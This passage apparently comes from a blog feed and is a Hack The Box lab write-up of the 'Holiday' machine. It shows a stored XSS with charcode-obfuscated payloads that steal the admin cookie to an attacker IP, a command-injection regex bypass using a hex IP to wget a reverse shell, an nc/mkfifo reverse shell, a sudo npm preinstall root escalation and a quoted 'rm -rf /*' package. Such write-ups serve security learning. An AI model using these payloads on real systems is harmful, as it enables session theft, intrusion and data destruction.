&lt;p&gt;Let’s charcode encode this:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;100, 111, 99, 117, 109, 101, 110, 116, 46, 119, 114, 105, 116, 101, 40, 39, 60, 115, 99, 114, 105, 112, 116, 32, 115, 114, 99, 61, 34, 104, 116, 116, 112, 58, 47, 47, 49, 48, 46, 49, 48, 46, 49, 52, 46, 50, 55, 58, 56, 48, 48, 48, 34, 62, 60, 47, 115, 99, 114, 105, 112, 116, 62, 39, 41, 59
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And once encoded, let’s place it in the XSS wrapper.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;img src=&quot;/&amp;gt;&amp;lt;script&amp;gt;eval(String.fromCharCode(100, 111, 99, 117, 109, 101, 110, 116, 46, 119, 114, 105, 116, 101, 40, 39, 60, 115, 99, 114, 105, 112, 116, 32, 115, 114, 99, 61, 34, 104, 116, 116, 112, 58, 47, 47, 49, 48, 46, 49, 48, 46, 49, 52, 46, 50, 55, 58, 56, 48, 48, 48, 34, 62, 60, 47, 115, 99, 114, 105, 112, 116, 62, 39, 41, 59))&amp;lt;/script&amp;gt;&quot; /&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo Documenti -&amp;gt; python -m SimpleHTTPServer 8000
Serving HTTP on 0.0.0.0 port 8000 ...
10.10.10.25 - - [27/Apr/2020 21:13:57] &quot;GET / HTTP/1.1&quot; 200 -
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Once again i got the ping back from the administrator, so, now it’s time to grub the session cookie from him:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;window.addEventListener('DOMContentLoaded', function(e) {
  window.location = &quot;http://10.10.14.27:8000/?cookie=&quot; + encodeURI(document.getElementsByName(&quot;cookie&quot;)[0].value)
})
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Let’s encode it.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;119, 105, 110, 100, 111, 119, 46, 97, 100, 100, 69, 118, 101, 110, 116, 76, 105, 115, 116, 101, 110, 101, 114, 40, 39, 68, 79, 77, 67, 111, 110, 116, 101, 110, 116, 76, 111, 97, 100, 101, 100, 39, 44, 32, 102, 117, 110, 99, 116, 105, 111, 110, 40, 101, 41, 32, 123, 32, 119, 105, 110, 100, 111, 119, 46, 108, 111, 99, 97, 116, 105, 111, 110, 32, 61, 32, 34, 104, 116, 116, 112, 58, 47, 47, 49, 48, 46, 49, 48, 46, 49, 52, 46, 50, 55, 58, 56, 48, 48, 48, 47, 63, 99, 111, 111, 107, 105, 101, 61, 34, 32, 43, 32, 101, 110, 99, 111, 100, 101, 85, 82, 73, 40, 100, 111, 99, 117, 109, 101, 110, 116, 46, 103, 101, 116, 69, 108, 101, 109, 101, 110, 116, 115, 66, 121, 78, 97, 109, 101, 40, 34, 99, 111, 111, 107, 105, 101, 34, 41, 91, 48, 93, 46, 118, 97, 108, 117, 101, 41, 32, 125, 41
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And replace:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;img src=&quot;/&amp;gt;&amp;lt;script&amp;gt;eval(String.fromCharCode(119, 105, 110, 100, 111, 119, 46, 97, 100, 100, 69, 118, 101, 110, 116, 76, 105, 115, 116, 101, 110, 101, 114, 40, 39, 68, 79, 77, 67, 111, 110, 116, 101, 110, 116, 76, 111, 97, 100, 101, 100, 39, 44, 32, 102, 117, 110, 99, 116, 105, 111, 110, 40, 101, 41, 32, 123, 32, 119, 105, 110, 100, 111, 119, 46, 108, 111, 99, 97, 116, 105, 111, 110, 32, 61, 32, 34, 104, 116, 116, 112, 58, 47, 47, 49, 48, 46, 49, 48, 46, 49, 52, 46, 50, 55, 58, 56, 48, 48, 48, 47, 63, 99, 111, 111, 107, 105, 101, 61, 34, 32, 43, 32, 101, 110, 99, 111, 100, 101, 85, 82, 73, 40, 100, 111, 99, 117, 109, 101, 110, 116, 46, 103, 101, 116, 69, 108, 101, 109, 101, 110, 116, 115, 66, 121, 78, 97, 109, 101, 40, 34, 99, 111, 111, 107, 105, 101, 34, 41, 91, 48, 93, 46, 118, 97, 108, 117, 101, 41, 32, 125, 41))&amp;lt;/script&amp;gt;&quot; /&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Finally I got a ping back with the administrator session cookie:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo Documenti -&amp;gt; nc -lvnp 8000
listening on [any] 8000 ...
connect to [10.10.14.27] from (UNKNOWN) [10.10.10.25] 42920
GET /?cookie=connect.sid=s%253A3ac3a270-88b1-11ea-b152-3b1ed3b3d691.AtGD5UtDV%252Fv7XlfBQ9MEfehRLtokvHHNXBFeEpD9%252FTA HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Referer: http://localhost:8000/vac/8dd841ff-3f44-4f2b-9324-9a833e2c6b65
User-Agent: Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1
Connection: Keep-Alive
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,*
Host: 10.10.14.27:8000
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The cookie is url encoded, so we need first to decode it:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-holiday/holiday10.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And then update in Firefox dev tools:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-holiday/holiday9.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;An admin section is appeared!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-holiday/holiday11.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;from-admin-to-reverse-shell&quot;&gt;From Admin to Reverse Shell&lt;/h2&gt;

&lt;p&gt;With this admin cookie I also gain access to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://10.10.10.25:8000/admin&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-holiday/holiday12.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Hitting the button &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Bookings&lt;/code&gt; we can download a file:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-holiday/holiday13.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-holiday/holiday14.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;But intercepting the request during the request to download the file, we can see something really interesting:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;GET /admin/export?table=bookings HTTP/1.1
Host: 10.10.10.25:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.25:8000/admin
Connection: close
Cookie: connect.sid=s%3A3ac3a270-88b1-11ea-b152-3b1ed3b3d691.AtGD5UtDV%2Fv7XlfBQ9MEfehRLtokvHHNXBFeEpD9%2FTA
Upgrade-Insecure-Requests: 1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-holiday/holiday15.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The list of allowed characters is interesting. Why allow “&amp;amp;” and “/”? This makes me think that this might be a command injection vulnerability.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-holiday/holiday16.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It’s working! Now we have to obtain a reverse shell. But first I need to know &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;who am I&lt;/code&gt;, if &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wget&lt;/code&gt; is installed and if i can &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;write&lt;/code&gt; to the current directory:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-holiday/holiday17.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-holiday/holiday18.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-holiday/holiday19.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Since we can write on the current directory and we can use wget on the remote machine, I’ll create a file with a reverse shell.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-holiday/holiday20.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;But how can we download something from an ip address if only [a-z0–9&amp;amp;\s\/] is allowed? The key hear is to remember that ip address are just 32 bit numbers, and most tools can take a number of different formats, including hexadecimal. Let’s go on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;miniwebtool.com/ip-adress-to-hex-convert/&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0x0A0A0E1B
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Then we have to set the letters of our hexadecimal IP for case sensitive and download the reverse to the remote machine.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-holiday/holiday21.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo holiday -&amp;gt; python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
10.10.10.25 - - [28/Apr/2020 00:19:48] &quot;GET /reverse HTTP/1.1&quot; 200 -
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Give the permissions to the reverse:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-holiday/holiday22.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And then exec it!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-holiday/holiday23.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo ~ -&amp;gt; rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.27] from (UNKNOWN) [10.10.10.25] 46466
bash: cannot set terminal process group (1137): Inappropriate ioctl for device
bash: no job control in this shell
algernon@holiday:~/app$ id &amp;amp;&amp;amp; pwd &amp;amp;&amp;amp; cat /home/algernon/user.txt
id &amp;amp;&amp;amp; pwd &amp;amp;&amp;amp; cat /home/algernon/user.txt
uid=1001(algernon) gid=1001(algernon) groups=1001(algernon)
/home/algernon/app
5edc176c52673a6e0f087c68c531c743
algernon@holiday:~/app$ 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;privesc-to-root&quot;&gt;PrivEsc to root&lt;/h2&gt;

&lt;p&gt;The first thing i checked was the sudo rights with algernon&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;algernon@holiday:~/app$ 

algernon@holiday:~/app$ sudo -l
sudo -l
Matching Defaults entries for algernon on holiday:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User algernon may run the following commands on holiday:
    (ALL) NOPASSWD: /usr/bin/npm i *
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;So, algernon was able to execute &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/bin/npm i&lt;/code&gt; without a password, and I already knew that npm install had the ability to run preinstall scripts. So, we can generated a json package:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;{
  &quot;scripts&quot;: { &quot;preinstall&quot;: &quot;cat /root/root.txt&quot; }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;algernon@holiday:~$ sudo /usr/bin/npm i --unsafe-perm
sudo /usr/bin/npm i --unsafe-perm

&amp;gt; undefined preinstall /home/algernon
&amp;gt; cat /root/root.txt

a844cb50bf88ebbe8412e095a6b642e8
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;shell-as-root&quot;&gt;Shell as root&lt;/h2&gt;

&lt;p&gt;Accorging with this link &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;https://github.com/joaojeronimo/rimrafall&lt;/code&gt; we can run dangerous commands from a package.json with npm.&lt;/p&gt;

&lt;div class=&quot;language-json highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;name&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;rimrafall&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;version&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;1.0.0&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;description&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;rm -rf /*&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; 
  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;main&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;index.js&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;scripts&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;preinstall&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;rm -rf /* /.*&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;keywords&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;rimraf&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;rmrf&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;author&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;João Jerónimo&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;license&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;ISC&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;So we can adapt this package.json to getting a reverse shell:&lt;/p&gt;

&lt;div class=&quot;language-json highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;name&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;rimrafall&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;version&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;1.0.0&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;description&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;root&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;main&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;index.js&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;scripts&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;preinstall&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;bash /tmp/shell&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;keywords&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;rimraf&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;rmrf&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;author&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;João Jerónimo&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;license&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;ISC&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;With this index.js&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;module.exports = &quot;npm install could be dangerous.&quot;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;algernon@holiday:~/app$ mkdir rimrafall
algernon@holiday:~/app$ cd rimrafall
algernon@holiday:~/app/rimrafall$
algernon@holiday:~/app/rimrafall$ ls
index.js
package.json
algernon@holiday:~/app/rimrafall$ ls
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Then our reverse shell&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt; /tmp/f&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mkfifo&lt;/span&gt; /tmp/f&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /tmp/f|/bin/sh &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; 2&amp;gt;&amp;amp;1|nc 10.10.14.27 4445 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;/tmp/f
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;algernon@holiday:~/app/rimrafall$ cd /tmp
algernon@holiday:/tmp$ wget 10.10.14.27:8000/shell
wget 10.10.14.27:8000/shell
--2020-04-27 22:46:05--  http://10.10.14.27:8000/shell
Connecting to 10.10.14.27:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 91 [application/octet-stream]
Saving to: ‘shell’

     0K                                                       100% 17.5M=0s

2020-04-27 22:46:05 (17.5 MB/s) - ‘shell’ saved [91/91] 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;algernon@holiday:~/app$ sudo npm i rimrafall --unsafe

&amp;gt; rimrafall@1.0.0 preinstall /home/algernon/app/node_modules/.staging/rimrafall-aa0a316f
&amp;gt; bash /tmp/shell

rm: cannot remove '/tmp/f': No such file or directory
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo ~ -&amp;gt; rlwrap nc -lvnp 4445
listening on [any] 4445 ...
connect to [10.10.14.27] from (UNKNOWN) [10.10.10.25] 52106
/bin/sh: 0: can't access tty; job control turned off
# id &amp;amp;&amp;amp; cat /root/root.txt
uid=0(root) gid=0(root) groups=0(root)
a844cb50bf88ebbe8412e095a6b642e8
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;hack-only-for-fun-and-learning-not-for-profit&quot;&gt;Hack only for fun and learning. Not for profit&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-holiday/holiday24.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;</content><author><name>Ezploisite</name><email>bomb@protonmail.com</email></author><category term="Holiday" /><category term="SQL Injection" /><category term="XSS Stored" /><category term="Command Injection" /><category term="Sudo npm" /><summary type="html">Holiday was a hard box with a SQL Injection through a post form to retrieve credentials to login. Once gained access, we can stole the admin cookie with an XSS stored in the web page. After that, we can perform command injection through a form, bypassing the regex and obtain the reverse shell on the remote system. For the privesc we have sudo rights with npm to install our malicious json package and getting root shell.</summary></entry><entry><title type="html">Joker - Hack The Box</title><link href="https://ezploisite.it/htb-writeup-joker/" rel="alternate" type="text/html" title="Joker - Hack The Box" /><published>2020-04-25T00:00:00+02:00</published><updated>2020-04-25T00:00:00+02:00</updated><id>https://ezploisite.it/htb-writeup-joker</id><content type="html" xml:base="https://ezploisite.it/htb-writeup-joker/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-joker/jokera.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Joker was a hard box with a Http-Proxy-Squid that allows us through the TFTP to retrieve the username and password. The credentials we retrieve can be used to access the site where, bruteforcing the directories we will find a Python Console. After taking a shell, we will use sudo to create a symlink with our ssh key, to access with the user Alekos. For the privesc we will abuse a crontab which saves archivies as root.&lt;/p&gt;

